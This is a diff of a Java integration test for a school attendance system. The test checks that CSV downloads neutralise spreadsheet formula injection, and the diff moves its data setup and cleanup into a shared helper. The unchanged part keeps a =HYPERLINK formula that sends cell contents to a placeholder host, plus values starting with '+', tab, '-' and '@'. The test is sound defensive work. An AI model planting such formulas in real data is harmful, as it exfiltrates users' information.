@@ -1,6 +1,6 @@
 package edu.cent35.asistencias.integracion;
 
-import edu.cent35.asistencias.DatosDePrueba;
+import edu.cent35.asistencias.EscenarioDePrueba;
 import edu.cent35.asistencias.config.TenantContext;
 import edu.cent35.asistencias.model.Asistencia;
 import edu.cent35.asistencias.model.BloquePresencia;
@@ -12,26 +12,14 @@ import edu.cent35.asistencias.model.EstadoAsistencia;
 import edu.cent35.asistencias.model.EstadoCierre;
 import edu.cent35.asistencias.model.EstadoSalida;
 import edu.cent35.asistencias.model.Horario;
-import edu.cent35.asistencias.model.Institucion;
 import edu.cent35.asistencias.model.Materia;
 import edu.cent35.asistencias.model.MetodoAsistencia;
 import edu.cent35.asistencias.model.OrigenMarca;
 import edu.cent35.asistencias.model.PuestoCaptura;
-import edu.cent35.asistencias.model.Rol;
 import edu.cent35.asistencias.model.Usuario;
 import edu.cent35.asistencias.repository.AsistenciaRepository;
 import edu.cent35.asistencias.repository.BloquePresenciaRepository;
-import edu.cent35.asistencias.repository.CarreraRepository;
-import edu.cent35.asistencias.repository.CicloLectivoRepository;
-import edu.cent35.asistencias.repository.ComisionRepository;
-import edu.cent35.asistencias.repository.DocenteRepository;
-import edu.cent35.asistencias.repository.HorarioRepository;
-import edu.cent35.asistencias.repository.InstitucionRepository;
-import edu.cent35.asistencias.repository.MateriaRepository;
-import edu.cent35.asistencias.repository.PeriodoLectivoRepository;
 import edu.cent35.asistencias.repository.PuestoCapturaRepository;
-import edu.cent35.asistencias.repository.RolRepository;
-import edu.cent35.asistencias.repository.UsuarioRepository;
 import edu.cent35.asistencias.seguridad.UsuarioAutenticado;
 import edu.cent35.asistencias.service.PuestoCapturaService;
 import org.junit.jupiter.api.AfterEach;
@@ -45,10 +33,7 @@ import org.springframework.test.context.ActiveProfiles;
 import org.springframework.test.web.servlet.MockMvc;
 
 import java.time.LocalDate;
-import java.time.LocalDateTime;
 import java.time.LocalTime;
-import java.util.List;
-import java.util.concurrent.atomic.AtomicInteger;
 
 import static org.assertj.core.api.Assertions.assertThat;
 import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.user;
@@ -74,8 +59,6 @@ import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.
 @ActiveProfiles("test")
 class DescargaCsvSeguraIT {
 
-    private static final AtomicInteger SECUENCIA = new AtomicInteger();
-
     private static final LocalDate LUNES = LocalDate.of(2026, 6, 15);
 
     /** Lo que de verdad intentaría alguien: abre una URL con el contenido de la planilla. */
@@ -83,18 +66,9 @@ class DescargaCsvSeguraIT {
         "=HYPERLINK(\"http://ejemplo.invalido/?d=\"&A1,\"Ver notas\")";
 
     @Autowired private MockMvc mockMvc;
-    @Autowired private InstitucionRepository institucionRepository;
-    @Autowired private CarreraRepository carreraRepository;
-    @Autowired private MateriaRepository materiaRepository;
-    @Autowired private ComisionRepository comisionRepository;
-    @Autowired private HorarioRepository horarioRepository;
-    @Autowired private DocenteRepository docenteRepository;
-    @Autowired private CicloLectivoRepository cicloRepository;
-    @Autowired private PeriodoLectivoRepository periodoRepository;
+    @Autowired private EscenarioDePrueba escenario;
     @Autowired private AsistenciaRepository asistenciaRepository;
     @Autowired private BloquePresenciaRepository bloqueRepository;
-    @Autowired private RolRepository rolRepository;
-    @Autowired private UsuarioRepository usuarioRepository;
     @Autowired private PuestoCapturaRepository puestoRepository;
     @Autowired private PuestoCapturaService puestoService;
 
@@ -103,62 +77,23 @@ class DescargaCsvSeguraIT {
 
     @BeforeEach
     void sembrar() {
-        Institucion inst = institucionRepository.save(Institucion.builder()
-            .nombre("Instituto del CSV " + SECUENCIA.incrementAndGet())
-            .activo(true).build());
-        tenantId = inst.getId();
+        tenantId = escenario.institucion("Instituto del CSV");
         TenantContext.set(tenantId);
 
-        Rol rol = rolRepository.findByCodigo("INSTITUCION").orElseGet(() -> {
-            Rol nuevo = new Rol();
-            nuevo.setCodigo("INSTITUCION");
-            nuevo.setDescripcion("Institucion");
-            return rolRepository.save(nuevo);
-        });
-        Usuario u = Usuario.builder()
-            .username("csv." + tenantId).email("csv." + tenantId + "@test.local")
-            .passwordHash("no-se-usa").activo(true).rol(rol)
-            .emailVerificadoEn(LocalDateTime.now())
-            .build();
-        u.setInstitucionId(tenantId);
-        cuenta = usuarioRepository.save(u);
-
-        Carrera carrera = Carrera.builder()
-            .codigo("CSV-" + tenantId).nombre("Tecnicatura").duracionAnios((short) 3)
-            .activo(true).build();
-        carrera.setInstitucionId(tenantId);
-        carrera = carreraRepository.save(carrera);
+        cuenta = escenario.cuenta(tenantId, "INSTITUCION", "csv." + tenantId);
+        Carrera carrera = escenario.carrera(tenantId, "CSV-" + tenantId);
 
         // Una materia con la fórmula adentro: el campo no tiene restricción de caracteres,
         // solo de largo, así que este nombre se puede cargar desde la pantalla.
-        Materia materia = Materia.builder()
-            .codigo("CSV1-" + tenantId).nombre(MATERIA_CON_FORMULA).carrera(carrera)
-            .anio((short) 1).activo(true).build();
-        materia.setInstitucionId(tenantId);
-        materia = materiaRepository.save(materia);
+        Materia materia = escenario.materia(carrera, "CSV1-" + tenantId, MATERIA_CON_FORMULA);
 
         // Apellido con '+' y nombre con un tabulador adelante: los otros dos arranques.
-        Docente docente = Docente.builder()
-            .persona(DatosDePrueba.personaDelTenant(
-                tenantId, "44" + tenantId, "\tAna", "+Pérez"))
-            .fechaAlta(LocalDate.of(2020, 1, 1)).activo(true).build();
-        docente.setInstitucionId(tenantId);
-        docente = docenteRepository.save(docente);
+        Docente docente = escenario.docente(tenantId, "44" + tenantId, "\tAna", "+Pérez");
+        CicloLectivo ciclo = escenario.ciclo(tenantId, 2026);
+        Comision comision = escenario.comision(materia, ciclo, docente, "@A");
 
-        CicloLectivo ciclo = cicloRepository.save(
-            DatosDePrueba.cicloAnualDelTenant(tenantId, 2026));
-
-        Comision comision = comisionRepository.save(Comision.builder()
-            .materia(materia).codigo("@A").docenteAsignado(docente).activo(true)
-            .periodo(ciclo.getPeriodos().get(0))
-            .build());
-
-        Horario horario = horarioRepository.save(Horario.builder()
-            .comision(comision)
-            .diaSemana((byte) LUNES.getDayOfWeek().getValue())
-            .horaInicio(LocalTime.of(18, 0)).horaFin(LocalTime.of(20, 0))
-            .toleranciaMin((short) 15).activo(true)
-            .build());
+        Horario horario = escenario.horario(comision, LUNES.getDayOfWeek(),
+            LocalTime.of(18, 0), LocalTime.of(20, 0));
 
         // El nombre del equipo lo escribe la institución y también viaja al CSV.
         puestoService.designar(tenantId, "-Entrada norte", cuenta);
@@ -186,21 +121,7 @@ class DescargaCsvSeguraIT {
 
     @AfterEach
     void limpiar() {
-        if (tenantId != null) {
-            borrar(asistenciaRepository, a -> tenantId.equals(a.getInstitucionId()));
-            borrar(bloqueRepository, b -> tenantId.equals(b.getInstitucionId()));
-            borrar(puestoRepository, p -> tenantId.equals(p.getInstitucionId()));
-            List<Long> comisionIds = comisionRepository.findAllDelTenant(tenantId).stream()
-                .map(Comision::getId).toList();
-            borrar(horarioRepository, h -> comisionIds.contains(h.getComision().getId()));
-            borrar(comisionRepository, c -> comisionIds.contains(c.getId()));
-            borrar(periodoRepository, p -> tenantId.equals(p.getInstitucionId()));
-            borrar(cicloRepository, c -> tenantId.equals(c.getInstitucionId()));
-            borrar(materiaRepository, m -> tenantId.equals(m.getInstitucionId()));
-            borrar(carreraRepository, c -> tenantId.equals(c.getInstitucionId()));
-            borrar(docenteRepository, d -> tenantId.equals(d.getInstitucionId()));
-            borrar(usuarioRepository, u -> tenantId.equals(u.getInstitucionId()));
-        }
+        escenario.borrarTodoDe(tenantId);
         TenantContext.clear();
     }
 
@@ -266,10 +187,5 @@ class DescargaCsvSeguraIT {
                 .with(user(new UsuarioAutenticado(cuenta))))
             .andExpect(status().isOk())
             .andReturn().getResponse().getContentAsString();
-    }
-
-    private <T> void borrar(org.springframework.data.jpa.repository.JpaRepository<T, ?> repo,
-                            java.util.function.Predicate<T> condicion) {
-        repo.deleteAll(repo.findAll().stream().filter(condicion).toList());
     }
 }
